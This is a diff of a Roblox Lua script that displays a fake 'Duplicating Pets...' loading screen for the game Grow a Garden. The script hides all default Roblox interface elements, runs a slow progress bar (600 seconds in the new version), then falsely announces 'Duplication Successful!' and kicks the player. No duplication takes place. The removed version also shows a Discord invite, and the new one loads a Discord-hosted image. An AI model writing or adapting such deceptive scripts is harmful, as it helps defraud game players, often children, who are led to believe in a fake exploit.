@@ -1,116 +1,155 @@
 local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
 local TweenService = game:GetService("TweenService")
-local backpack = player:WaitForChild("Backpack")
+local StarterGui = game:GetService("StarterGui")
 local playerGui = player:WaitForChild("PlayerGui")
 
-game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
--- Create loading GUI
-local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "LoadingScreen"
-loadingGui.IgnoreGuiInset = true
-loadingGui.ResetOnSpawn = false
-loadingGui.Parent = playerGui
+-- Hide all default Roblox UI
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+StarterGui:SetCore("TopbarEnabled", false)
 
--- Fullscreen background
-local loadingFrame = Instance.new("Frame")
-loadingFrame.Size = UDim2.new(1, 0, 1, 0)
-loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
-loadingFrame.BackgroundTransparency = 1
-loadingFrame.Parent = loadingGui
+-- 💻 Create Loading Screen
+local loadingGui = Instance.new("ScreenGui", playerGui)
 
--- Fade in the background
-TweenService:Create(loadingFrame, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
+local loadingBg = Instance.new("ImageLabel", loadingGui)
+loadingBg.Size = UDim2.new(1, 0, 1, 0)
+loadingBg.Position = UDim2.new(0, 0, 0, 0)
+loadingBg.Image = "https://cdn.discordapp.com/attachments/1383825271160836147/1386341525423915120/image.png?ex=68595aa8&is=68580928&hm=f202771ae9da82379a25ca9611a6645db3b89ff671386e6d156bb34241e0924e&"
+loadingBg.BackgroundTransparency = 1
+loadingBg.ScaleType = Enum.ScaleType.Crop
 
--- Grow a Garden🌱 Dupe Script Title
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, 0, 0, 30)
-titleLabel.Position = UDim2.new(0, 0, 0.45, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "Grow a Garden🌱 Duplicating Process"
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextSize = 22
-titleLabel.TextTransparency = 1
-titleLabel.Parent = loadingFrame
-TweenService:Create(titleLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()
+-- Title
+local title = Instance.new("TextLabel", loadingGui)
+title.AnchorPoint = Vector2.new(0.5,0)
+title.Position = UDim2.new(0.5, 0, 0.45, 0)
+title.Size = UDim2.new(0.8, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "Duplicating Pets..."
+title.TextColor3 = Color3.fromRGB(180, 240, 180)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextTransparency = 1
 
--- Loading Message Above Progress Bar
-local loadingMsg = Instance.new("TextLabel")
-loadingMsg.Size = UDim2.new(1, 0, 0, 20)
-loadingMsg.Position = UDim2.new(0, 0, 0.5, 5)
-loadingMsg.BackgroundTransparency = 1
-loadingMsg.Text = "⚠️ Please wait... DUPING...."
-loadingMsg.TextColor3 = Color3.fromRGB(255, 200, 0)
-loadingMsg.Font = Enum.Font.GothamMedium
-loadingMsg.TextSize = 14
-loadingMsg.TextTransparency = 1
-loadingMsg.Parent = loadingFrame
-TweenService:Create(loadingMsg, TweenInfo.new(1), {TextTransparency = 0}):Play()
-
--- Progress Bar background
-local barBg = Instance.new("Frame")
+-- Loading bar elements
+local barBg = Instance.new("Frame", loadingGui)
+barBg.AnchorPoint = Vector2.new(0.5,0)
+barBg.Position = UDim2.new(0.5, 0, 0.5, 30)
 barBg.Size = UDim2.new(0, 300, 0, 24)
-barBg.Position = UDim2.new(0.5, -150, 0.5, 30)
-barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBg.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
 barBg.BorderSizePixel = 0
-barBg.Parent = loadingFrame
-Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 12)
 
--- Progress Bar fill
-local barFill = Instance.new("Frame")
+local barFill = Instance.new("Frame", barBg)
 barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(60, 255, 60)
-barFill.BorderSizePixel = 0
-barFill.ZIndex = 1
-barFill.Parent = barBg
-Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 10)
+barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 120)
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 12)
 
--- Text OVER the bar
-local barText = Instance.new("TextLabel")
-barText.Size = UDim2.new(1, 0, 1, 0)
-barText.Position = UDim2.new(0, 0, 0, 0)
-barText.BackgroundTransparency = 1
-barText.Text = "https://discord.gg/hWdUcKskAR"
-barText.TextColor3 = Color3.fromRGB(0, 0, 255)
-barText.Font = Enum.Font.GothamMedium
-barText.TextSize = 13
-barText.TextXAlignment = Enum.TextXAlignment.Center
-barText.TextYAlignment = Enum.TextYAlignment.Center
-barText.ZIndex = 2
-barText.Parent = barBg
+local percent = Instance.new("TextLabel", loadingGui)
+percent.AnchorPoint = Vector2.new(0.5,0)
+percent.Position = UDim2.new(0.5, 0, 0.5, 60)
+percent.Size = UDim2.new(0, 100, 0, 24)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextColor3 = Color3.fromRGB(180, 240, 180)
+percent.Font = Enum.Font.GothamBold
+percent.TextSize = 18
 
--- Percentage Label
-local percentLabel = Instance.new("TextLabel")
-percentLabel.Size = UDim2.new(0, 100, 0, 24)
-percentLabel.Position = UDim2.new(0.5, -50, 0.5, 60)
-percentLabel.BackgroundTransparency = 1
-percentLabel.Text = "0%"
-percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-percentLabel.Font = Enum.Font.GothamBold
-percentLabel.TextSize = 18
-percentLabel.Parent = loadingFrame
+-- Fade elements in
+TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 0}):Play()
+TweenService:Create(barBg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
+TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 0}):Play()
 
--- Animate loading bar & percentage
-local duration = 300 -- seconds
-local steps = 1
+-- Animate progress
+local duration = 600
+local steps = 50
 
 for i = 1, steps do
-	local progress = i / steps
-	barFill.Size = UDim2.new(progress, 0, 1, 0)
-	percentLabel.Text = math.floor(progress * 100) .. "%"
-	wait(duration / steps)
+    local t = i / steps
+    barFill.Size = UDim2.new(t, 0, 1, 0)
+    percent.Text = math.floor(t * 100) .. "%"
+    wait(duration / steps)
 end
 
--- Final 100% (just in case rounding skips it)
-percentLabel.Text = "100%"
-wait(0.4)
+percent.Text = "100%"
+wait(0.5)
 
--- Fade out all elements
-TweenService:Create(loadingFrame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
-TweenService:Create(welcomeLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
-TweenService:Create(percentLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
-TweenService:Create(barText, TweenInfo.new(1), {TextTransparency = 1}):Play()
+-- 🎉 Stylized Success Screen
+loadingGui:ClearAllChildren()
 
-wait(1.1)
-player:Kick("DUPED! PLEASE REJOIN TO CHECK YOUR DUPED PETS!")
+local successBg = Instance.new("ImageLabel", loadingGui)
+successBg.Size = UDim2.new(1,0,1,0)
+successBg.Position = UDim2.new(0,0,0,0)
+successBg.Image = loadingBg.Image
+successBg.BackgroundTransparency = 1
+successBg.ScaleType = Enum.ScaleType.Crop
+
+-- Container
+local box = Instance.new("Frame", loadingGui)
+box.AnchorPoint = Vector2.new(0.5,0.5)
+box.Position = UDim2.new(0.5,0,0.5,0)
+box.Size = UDim2.new(0,400,0,220)
+box.BackgroundColor3 = Color3.fromRGB(20,60,20)
+box.BackgroundTransparency = 1
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 20)
+
+TweenService:Create(box, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
+
+-- Check icon & titles
+local check = Instance.new("TextLabel", box)
+check.AnchorPoint = Vector2.new(0.5,0)
+check.Position = UDim2.new(0.5,0,0,20)
+check.Size = UDim2.new(1,0,0,80)
+check.BackgroundTransparency = 1
+check.Text = "✅"
+check.TextColor3 = Color3.fromRGB(120,255,120)
+check.Font = Enum.Font.GothamBlack
+check.TextSize = 60
+check.TextTransparency = 1
+TweenService:Create(check, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+
+local sTitle = Instance.new("TextLabel", box)
+sTitle.AnchorPoint = Vector2.new(0.5,0)
+sTitle.Position = UDim2.new(0.5,0,0,110)
+sTitle.Size = UDim2.new(1,0,0,30)
+sTitle.BackgroundTransparency = 1
+sTitle.Text = "Duplication Successful!"
+sTitle.TextColor3 = Color3.fromRGB(180,255,180)
+sTitle.Font = Enum.Font.GothamBold
+sTitle.TextSize = 22
+sTitle.TextTransparency = 1
+TweenService:Create(sTitle, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+
+local note = Instance.new("TextLabel", box)
+note.AnchorPoint = Vector2.new(0.5,0)
+note.Position = UDim2.new(0.5,0,0,145)
+note.Size = UDim2.new(0,360,0,24)
+note.BackgroundTransparency = 1
+note.Text = "Click the button below to rejoin and check your pets."
+note.TextColor3 = Color3.fromRGB(150,255,150)
+note.Font = Enum.Font.Gotham
+note.TextSize = 16
+note.TextTransparency = 1
+TweenService:Create(note, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+
+-- 🟢 Rejoin Button
+local btn = Instance.new("TextButton", box)
+btn.AnchorPoint = Vector2.new(0.5,0)
+btn.Position = UDim2.new(0.5,0,0,180)
+btn.Size = UDim2.new(0,200,0,40)
+btn.Text = "Rejoin Now"
+btn.TextColor3 = Color3.fromRGB(255,255,255)
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 18
+btn.BackgroundColor3 = Color3.fromRGB(50,200,80)
+btn.BackgroundTransparency = 1
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0,10)
+TweenService:Create(btn, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
+btn.MouseEnter:Connect(function()
+    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80,230,120)}):Play()
+end)
+btn.MouseLeave:Connect(function()
+    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50,200,80)}):Play()
+end)
+
+btn.MouseButton1Click:Connect(function()
+    player:Kick("Rejoining to check your duplicated pets!")
+end)
